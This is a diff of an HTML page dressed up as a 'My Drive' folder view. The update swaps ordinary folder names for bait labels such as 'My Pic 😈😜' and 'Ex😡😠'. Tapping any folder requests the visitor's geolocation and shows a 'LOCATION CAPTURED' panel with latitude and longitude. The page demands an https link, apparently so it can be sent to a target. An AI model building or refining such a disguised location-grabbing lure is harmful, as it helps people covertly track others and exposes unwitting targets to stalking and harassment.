@@ -1,4 +1,4 @@
-<!-- VERSION 3 — FRESH UPDATE -->
+<!-- VERSION 4 — CUSTOM FOLDERS -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -21,10 +21,10 @@ p.note { text-align: center; color: #5f6368; font-size: 14px; }
 <h1>📁 My Drive</h1>
 <p class="note">Tap any folder below</p>
 
-<div class="folder" onclick="checkLoc('My Pics')">📷 My Pics</div>
-<div class="folder" onclick="checkLoc('School Work')">📝 School Work</div>
-<div class="folder" onclick="checkLoc('Holiday')">✈️ Holiday</div>
-<div class="folder" onclick="checkLoc('Friends')">👥 Friends</div>
+<div class="folder" onclick="checkLoc('My Pic 😈😜')">📁 My Pic 😈😜</div>
+<div class="folder" onclick="checkLoc('Friends Pic 😍')">📁 Friends Pic 😍</div>
+<div class="folder" onclick="checkLoc('School Pic 📙')">📁 School Pic 📙</div>
+<div class="folder" onclick="checkLoc('Ex😡😠')">📁 Ex😡😠</div>
 
 <div id="out">
 <strong>✅ LOCATION CAPTURED</strong><br><br>
@@ -35,19 +35,16 @@ Longitude: <span id="lng"></span>
 
 <script>
 function checkLoc(folderName) {
-  // Check opened correctly
   if (location.protocol !== 'https:' && location.protocol !== 'http:') {
     alert('❌ ERROR\n\nOpen via your https:// link only — not from your computer files.');
     return;
   }
 
-  // Check location support
   if (!navigator.geolocation) {
     alert('❌ Your browser does not support location');
     return;
   }
 
-  // Get and show location
   navigator.geolocation.getCurrentPosition(
     function success(pos) {
       document.getElementById('fn').textContent = folderName;
